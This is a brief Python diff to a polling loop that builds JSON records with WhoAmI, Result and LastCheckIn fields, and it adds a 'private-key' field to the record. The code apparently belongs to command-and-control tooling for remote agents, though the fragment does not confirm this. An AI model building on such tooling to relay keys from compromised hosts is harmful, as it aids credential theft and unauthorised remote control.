@@ -48,6 +48,7 @@ while True:
             LastInteraction = connector["LastInteraction"]
             whoami = connector["WhoAmI"]
             result = connector["Result"]
+            key = connector["private-key"]
             structure = {
                 "WhoAmI": f"{whoami}",
                 "Retrieved": "1",  # Set retrieved to 1 so we know we got results
@@ -55,6 +56,7 @@ while True:
                 "LastInteraction": f"{LastInteraction}",
                 "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
                 "Result": f"{result}",
+                "private-key": f"{key}",
                 "GotIt": "0"
             }
             structure = json.dumps(structure)  # Dump the json
